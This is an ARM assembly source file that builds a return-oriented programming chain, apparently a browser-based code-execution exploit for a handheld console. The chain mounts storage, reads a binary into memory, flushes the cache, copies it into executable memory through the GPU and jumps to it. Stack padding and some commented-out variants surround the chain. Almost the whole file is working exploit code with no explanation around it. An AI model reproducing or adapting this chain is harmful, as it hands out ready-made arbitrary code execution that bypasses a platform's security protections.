	.arm
	.text

#include "rop.h"

#ifndef SPIDER_ARM_CODE_SIZE
	#define SPIDER_ARM_CODE_SIZE 0x00004000
#endif

#define CODE_ENTRY_2X	0x200000

	.global	_start
@---------------------------------------------------------------------------------
_start:
	rop_fs_mount(DMC)
	rop_file_open(THIS, FileName, FILE_READ | FILE_WRITE)
	rop_store(THIS+4, 0)
	rop_file_read(THIS, THIS+0x20, CODE_ENTRY_2X, SPIDER_ARM_CODE_SIZE)
	@rop_file_write(THIS, THIS+0x20, CODE_ENTRY_2X, SPIDER_ARM_CODE_SIZE)
	rop_flush_data_cache(BUFFER_LOC, 0x38400*2)
	rop_gx_texture_copy(BUFFER_LOC, 0x1F48F000, 0x38400*2)
	rop_sleep(4000000000)
	@.word POP_PC, POP_PC, POP_PC, POP_PC, POP_PC, POP_PC, POP_PC
	.word CODE_ENTRY_2X
	@.word 0x0024847d @infloop
@.org 0x0F4, GARBAGE
	.fill 3, 4, GARBAGE
	.word ROP_LOC+_start+0x8C
@.org 0x128, GARBAGE
	.fill 12, 4, GARBAGE
	.word ROP_LOC+_start, 0, POP_PC
@.org 0x158, GARBAGE
	.fill 9, 4, GARBAGE
	.fill 2, 4, POP_PC
FileName:
	.string16 "dmc:/"
@.org 0x21C, GARBAGE
	.fill 44, 4, GARBAGE
	.word MAGIC

	@rop_flush_data_cache(BUFFER_LOC, 0x38400*2)
	@rop_gx_texture_copy(BUFFER_LOC, 0x1F48F000, 0x38400*2)
	@.word POP_PC
	@rop_sleep(1000000000)
	@rop_fs_mount(DMC)
	@rop_file_open(THIS, FileName, FILE_CREATE | FILE_WRITE)
	@rop_file_open(THIS, FileName, FILE_READ)
	@rop_file_read(THIS, THIS+0x20, 0x100000, SPIDER_ARM_CODE_SIZE)
	@rop_sleep(1000000000)
	@.word 0x100000
@FileName:
@	.string16 "dmc:/arm11.bin"
